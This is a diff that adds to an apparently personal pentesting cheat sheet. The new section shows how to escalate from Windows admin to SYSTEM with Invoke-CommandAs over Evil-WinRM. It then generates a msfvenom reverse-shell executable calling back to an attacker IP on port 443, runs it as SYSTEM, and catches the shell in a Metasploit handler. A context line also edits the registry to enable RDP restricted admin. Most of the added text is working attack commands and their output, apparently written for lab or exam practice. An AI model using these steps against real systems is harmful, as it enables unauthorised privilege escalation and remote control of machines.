@@ -27,6 +27,23 @@ exiftool -a -u brochure.pdf
 
 #### Windows
 
+When we are admin but cannot execute commands as nt authority\\system we can use this two powershell scripts (**[Invoke-CommandAs](https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1) and **[Invoke-CommandAs.ps1](https://gist.githubusercontent.com/amnich/6485c57e15d8272205d9c11dbaf419b7/raw/8a0914af1e0fe04b5815b3b703aa6c0a8c4ca163/Invoke-CommandAs.ps1)**)
+```shell
+*Evil-WinRM* PS C:\> Import-Module .\Invoke-CommandAs.ps1
+*Evil-WinRM* PS C:\> Import-Module .\Invoke-ScheduledTask.ps1
+*Evil-WinRM* PS C:\> Invoke-CommandAs -ScriptBlock {whoami} -AsSystem
+	nt authority\system
+```
+We can create a msfvenom exe payload and catch the shell with a meterpreter session
+```shell
+kali # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.204 LPORT=443 -f exe -o shell.exe
+----
+*Evil-WinRM* PS C:\> Invoke-CommandAs -ScriptBlock {C:\Users\Administrator\Documents\shell.exe} -AsSystem
+----
+msf6 exploit(multi/handler) > run
+[*] Command shell session 1 opened (192.168.45.204:443 -> 192.168.222.147:60443) at 2024-02-29 13:46:59 +0100
+```
+
 When xfreerdp admin doesn't work
 ```shell
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
